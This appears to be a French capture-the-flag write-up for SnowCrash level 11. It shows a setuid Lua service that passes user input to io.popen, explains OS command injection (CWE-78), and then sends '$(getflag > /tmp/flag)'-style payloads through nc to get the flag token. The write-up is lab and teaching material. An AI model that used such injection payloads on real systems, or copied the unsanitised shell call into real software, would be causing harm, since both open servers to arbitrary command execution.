# LEVEL 11

### Reconnaissance

En se connectant au level11 on trouve un fichier .lua

```
level11@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
```

On l'a déja vu lors de la reconnaissance de départ avec les connections en attente:
```
[...]
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      3011       12308       -  
[...]
```
**ET** dans la liste des process:
```
[...]
- flag11    1808  0.0  0.0   2892   828 ?        S    10:07   0:00 lua /home/user/level11/level11.lua
[...]
```

Nous n'avons donc pas a lancer le programme etant donné qu'il est déja en ecoute sur le port 5151:
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: test
Erf nope..
```

On va essayer de comprendre ce qu'il attend:
```
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

On a donc un programme qui attend qu'un utilisateur se connecte et donne un mot de passe
Avec quelques recherche sur les vulnératbilités de ce language, la fonction io.popen est dangereuse.

**OS Command Injection**

*OS command injection flaws (CWE-78) allow attackers to run arbitrary commands on the remote server. Because a command injection vulnerability may lead to compromise of the server hosting the web application, it is often considered a very serious flaw. In Lua, this kind of vulnerability occurs, for example, when a developer uses unvalidated user data to run operating system commands via the os.execute() or io.popen() Lua functions.*
*Source:* https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities 

### Exploitation

On va simplement faire une injection de commande :)
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: $(whoami > /tmp/whoami)
Erf nope..
level11@SnowCrash:~$ cat /tmp/whoami
flag11
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: $(getflag > /tmp/flag)
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

